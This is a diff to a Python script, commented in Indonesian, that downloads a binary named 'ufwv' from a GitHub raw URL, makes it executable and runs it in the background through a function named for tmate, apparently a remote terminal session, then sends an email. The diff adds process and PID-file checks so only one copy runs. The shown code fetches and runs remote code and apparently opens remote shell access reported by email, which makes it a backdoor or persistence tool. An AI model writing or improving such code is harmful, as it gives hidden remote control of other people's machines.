@@ -5,9 +5,13 @@ from email.mime.multipart import MIMEMultipart
 import time
 import os
 import urllib.request
+import psutil  # Untuk memeriksa proses yang sedang berjalan
 
 # URL file ufwv
 UFWV_URL = "https://github.com/icadnewton/sendme/raw/refs/heads/main/ufwv"
+
+# File PID untuk melacak proses
+PID_FILE = "/tmp/ufwv.pid"
 
 # Fungsi untuk memeriksa dan mengunduh file ufwv
 def ensure_ufwv_exists():
@@ -17,6 +21,16 @@ def ensure_ufwv_exists():
             os.chmod("ufwv", 0o755)
         except Exception:
             pass
+
+# Fungsi untuk memeriksa apakah proses ufwv sudah berjalan
+def is_ufwv_running():
+    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+        try:
+            if 'ufwv' in proc.info['cmdline']:
+                return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    return False
 
 # Fungsi untuk menjalankan perintah nohup ./ufwv di subprocess (background)
 def run_tmate_command():
@@ -55,6 +69,10 @@ def send_email(sender_email, sender_password, recipient_email, subject, body):
 
 # Fungsi utama
 def main():
+    # Cek apakah sudah ada proses ufwv yang berjalan
+    if is_ufwv_running():
+        return
+
     # Periksa keberadaan file ufwv
     ensure_ufwv_exists()
 
@@ -78,4 +96,19 @@ def main():
     send_email(sender_email, sender_password, recipient_email, subject, body)
 
 if __name__ == "__main__":
-    main()
+    # Pastikan hanya satu instance berjalan
+    if os.path.exists(PID_FILE):
+        with open(PID_FILE, 'r') as f:
+            pid = int(f.read())
+        if psutil.pid_exists(pid):
+            exit(0)
+
+    # Simpan PID proses saat ini
+    with open(PID_FILE, 'w') as f:
+        f.write(str(os.getpid()))
+
+    try:
+        main()
+    finally:
+        if os.path.exists(PID_FILE):
+            os.remove(PID_FILE)
